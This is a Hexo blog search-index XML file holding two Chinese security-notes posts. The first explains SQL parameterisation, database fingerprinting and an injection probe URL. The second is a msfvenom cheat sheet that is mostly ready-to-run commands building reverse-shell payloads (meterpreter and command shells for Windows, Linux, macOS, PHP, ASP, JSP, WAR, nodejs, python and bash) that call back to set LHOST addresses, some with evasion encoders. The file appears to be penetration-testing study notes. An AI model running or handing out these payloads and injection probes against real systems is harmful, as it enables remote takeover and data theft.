<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>sql参数化</title>
    <url>/2020/03/29/sql%E5%8F%82%E6%95%B0%E5%8C%96/</url>
    <content><![CDATA[<h2 id="sql参数化"><a href="#sql参数化" class="headerlink" title="sql参数化"></a>sql参数化</h2><p>sql参数化可以从根本上防止sql注入，sql注入的根本在于用户恶意拼接sql语句，数据库会将整个sql语句执行，而sql参数化采用预编译的方式，将用户输入的数据作为参数处理。下面是一段网上的java的预编译代码，很好理解。</p>
<a id="more"></a>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"></span><br><span class="line">String sql = <span class="string">"select * from user where username=? and passwd=?"</span>;</span><br><span class="line">ps = conn.PreparedStatement(sql);</span><br><span class="line">ps.setString(<span class="number">1</span>, <span class="string">"admin"</span>);</span><br><span class="line">ps.setString(<span class="number">2</span>, <span class="string">"123456"</span>);</span><br><span class="line">resultSet = ps.executeQuery();</span><br></pre></td></tr></table></figure>

<p>在这段代码中就不会存在sql拼接的现象，即使用户输入<code>username</code>=<code>admin‘ or 1=1</code>，数据库在执行时只会把这个当做一个用户，去查询有没有<code>admin‘ or 1=1</code>的用户。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><blockquote>
<p><a href="https://www.zhihu.com/question/52869762" target="_blank" rel="noopener">https://www.zhihu.com/question/52869762</a></p>
</blockquote>
<h3 id="sql数据库识别"><a href="#sql数据库识别" class="headerlink" title="sql数据库识别"></a>sql数据库识别</h3><p>常见的数据库一般有mysql，access，oracle，postgresql，sqlserver（mssql) 这五类</p>
<h4 id="根据框架组合识别"><a href="#根据框架组合识别" class="headerlink" title="根据框架组合识别"></a>根据框架组合识别</h4><table>
<thead>
<tr>
<th align="center">框架</th>
<th align="center">常用数据库</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Asp和。net</td>
<td align="center">sqlserver</td>
</tr>
<tr>
<td align="center">php</td>
<td align="center">mysql和postgesql</td>
</tr>
<tr>
<td align="center">java</td>
<td align="center">oracle和mysql</td>
</tr>
<tr>
<td align="center">iis（基于windows）</td>
<td align="center">sqlserver</td>
</tr>
<tr>
<td align="center">apache</td>
<td align="center">mysql和postgresql</td>
</tr>
<tr>
<td align="center">asp</td>
<td align="center">access和sqlserver</td>
</tr>
</tbody></table>
<h4 id="报错信息判断"><a href="#报错信息判断" class="headerlink" title="报错信息判断"></a>报错信息判断</h4><p>在参数后面加个’或者”如<code>id=1&#39;</code>尝试引发报错，通过回显错误信息判断</p>
<p>对于<code>acecss</code>数据库会回显<code>Microsoft JET Database Engine 错误’80040e14</code> </p>
<p>对于<code>sqlserver</code>数据库会回显<code>ODBC</code>,<code>Msg</code></p>
<p>对于<code>mysql</code>数据库会回显<code>you have an error in your SQL syntax</code></p>
<p>对于<code>oracle</code>数据库会回显<code>ora-错误编号</code></p>
<h4 id="特定连接符判断"><a href="#特定连接符判断" class="headerlink" title="特定连接符判断"></a>特定连接符判断</h4><table>
<thead>
<tr>
<th align="center">数据库</th>
<th align="center">连接符查询</th>
</tr>
</thead>
<tbody><tr>
<td align="center">mysql</td>
<td align="center">select ‘str’’ing’ <br />select concat(‘str’,’’ing)<br /> select ‘str’+’ing’</td>
</tr>
<tr>
<td align="center">sqlserver</td>
<td align="center">select ‘str’+’ing’</td>
</tr>
<tr>
<td align="center">oracle</td>
<td align="center">select ‘str’||’ing’ <br />select concat(‘str’,’’ing)</td>
</tr>
</tbody></table>
<h4 id="通过不同数据库特有的表判断"><a href="#通过不同数据库特有的表判断" class="headerlink" title="通过不同数据库特有的表判断"></a>通过不同数据库特有的表判断</h4><table>
<thead>
<tr>
<th align="center">数据库</th>
<th align="center">特有的表</th>
</tr>
</thead>
<tbody><tr>
<td align="center">mysql（&gt;5.0）</td>
<td align="center">information_schema.TABLES</td>
</tr>
<tr>
<td align="center">sqlserver</td>
<td align="center">sysobjects</td>
</tr>
<tr>
<td align="center">oracle</td>
<td align="center">sys.user_tables</td>
</tr>
<tr>
<td align="center">access</td>
<td align="center">msysobjects</td>
</tr>
</tbody></table>
<p>在存在注入点的情况下可以使用以下用法判断</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from 特有表名)&gt;0 and 1&#x3D;1</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Web漏洞基础知识</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>msfvenom用法</title>
    <url>/2020/03/29/msfvenom/</url>
    <content><![CDATA[<h2 id="msfvenom用法"><a href="#msfvenom用法" class="headerlink" title="msfvenom用法"></a>msfvenom用法</h2><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><a id="more"></a>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Options:</span><br><span class="line">   -l, --list            &lt;type&gt;        # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, platforms, archs, encrypt, formats等等</span><br><span class="line">   -p, --payload         &lt;payload&gt;     # 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取</span><br><span class="line">       --list-options                  # 列出--payload &lt;value&gt; 的标准，高级和规避选项</span><br><span class="line">   -f, --format          &lt;format&gt;      # 指定 Payload 的输出格式(使用 --list formats 列出)</span><br><span class="line">   -e, --encoder         &lt;encoder&gt;     # 指定使用的 Encoder (使用 --list encoders 列出)</span><br><span class="line">       --sec-name        &lt;value&gt;       # 生成大型Windows二进制文件时使用的新名称。默认值：随机4个字符的字符串</span><br><span class="line">       --smallest                      # 使用所有可用的编码器生成最小的payload</span><br><span class="line">       --encrypt         &lt;value&gt;       # 应用于shellcode的加密或编码类型 (使用--list encrypt 列出)</span><br><span class="line">       --encrypt-key     &lt;value&gt;       # 用于加密的密钥</span><br><span class="line">       --encrypt-iv      &lt;value&gt;       # 加密的初始化向量</span><br><span class="line">   -a, --arch            &lt;arch&gt;        # 指定目标系统架构(使用 --list archs  列出)</span><br><span class="line">       --platform        &lt;platform&gt;    # 指定目标系统平台 (使用 --list platforms 列出)</span><br><span class="line">   -o, --out             &lt;path&gt;        # 保存payload文件</span><br><span class="line">   -b, --bad-chars       &lt;list&gt;        # 设置需要在 Payload 中避免出现的字符，如： '\x00\xff'</span><br><span class="line">   -n, --nopsled         &lt;length&gt;      # 指定 nop 在 payload 中的数量</span><br><span class="line">   -s, --space           &lt;length&gt;      # 设置未经编码的 Payload 的最大长度</span><br><span class="line">       --encoder-space   &lt;length&gt;      # 编码后的 Payload 的最大长度</span><br><span class="line">   -i, --iterations      &lt;count&gt;       # 设置 Payload 的编码次数</span><br><span class="line">   -c, --add-code        &lt;path&gt;        # 指定包含一个额外的win32 shellcode文件</span><br><span class="line">   -x, --template        &lt;path&gt;        # 指定一个特定的可执行文件作为模板</span><br><span class="line">   -k, --keep                          # 保护模板程序的功能，注入的payload作为一个新的进程运行</span><br><span class="line">   -v, --var-name        &lt;value&gt;       # 指定一个变量名（当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）</span><br><span class="line">   -t, --timeout         &lt;second&gt;      # 设置从STDIN读取payload的等待时间（默认为30,0为禁用）</span><br><span class="line">   -h, --help                          # 帮助</span><br></pre></td></tr></table></figure>



<h4 id="使用–list-encorders查看所有编码器"><a href="#使用–list-encorders查看所有编码器" class="headerlink" title="使用–list encorders查看所有编码器"></a>使用–list encorders查看所有编码器</h4><p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200325160228.png" alt=""></p>
<p>同理可以使用</p>
<p><code>--list payloads</code> 查看所有payloads</p>
<p><code>--list archs</code> 查看所有架构</p>
<p><code>--list platform</code> 查看所有平台。</p>
<p><code>--list formats</code> 查看所有输出格式</p>
<p><code>--list</code> 也可以使用<code>-l</code>代替</p>
<h3 id="生成payload的不同方式"><a href="#生成payload的不同方式" class="headerlink" title="生成payload的不同方式"></a>生成payload的不同方式</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><h5 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.222.135 LPORT=4567 -f exe -e x86/shikata_ga_nai &gt; shell.ex</span><br></pre></td></tr></table></figure>

<h5 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.222.135 LPORT=4567 -f exe -e powershell_base64 &gt; shell.exe</span><br></pre></td></tr></table></figure>



<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><h5 id="32位-1"><a href="#32位-1" class="headerlink" title="32位"></a>32位</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.222.135 LPORT=4567 -f elf -e x86/shikata_ga_nai &gt; shell.elf</span><br></pre></td></tr></table></figure>

<h5 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.222.135 LPORT=4567 -f elf -e powershell_base64 &gt; shell.elf</span><br></pre></td></tr></table></figure>

<h4 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h4><h5 id="32位-2"><a href="#32位-2" class="headerlink" title="32位"></a>32位</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.222.135 LPORT=4567  -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>



<h4 id="WEB常用"><a href="#WEB常用" class="headerlink" title="WEB常用"></a>WEB常用</h4><h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

<h5 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

<h5 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

<h5 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

<h5 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f raw -o shell.js</span><br></pre></td></tr></table></figure>

<h4 id="各种语言的脚本"><a href="#各种语言的脚本" class="headerlink" title="各种语言的脚本"></a>各种语言的脚本</h4><h5 id="python"><a href="#python" class="headerlink" title="python"></a>python</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">第一种Linux下使用python反弹一个cmd形式的shell:</span><br><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.223 LPORT=9999 -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line">第二种反弹一个meterpreter形式的shell(windows|Linux都可以):</span><br><span class="line">msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

<h5 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.223 LPORT=9999 -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>



<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><blockquote>
<p><a href="https://mature-sec.com/post/msfvenom使用小结/" target="_blank" rel="noopener">https://mature-sec.com/post/msfvenom%E4%BD%BF%E7%94%A8%E5%B0%8F%E7%BB%93/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>后渗透</category>
      </categories>
      <tags>
        <tag>msf</tag>
      </tags>
  </entry>
</search>
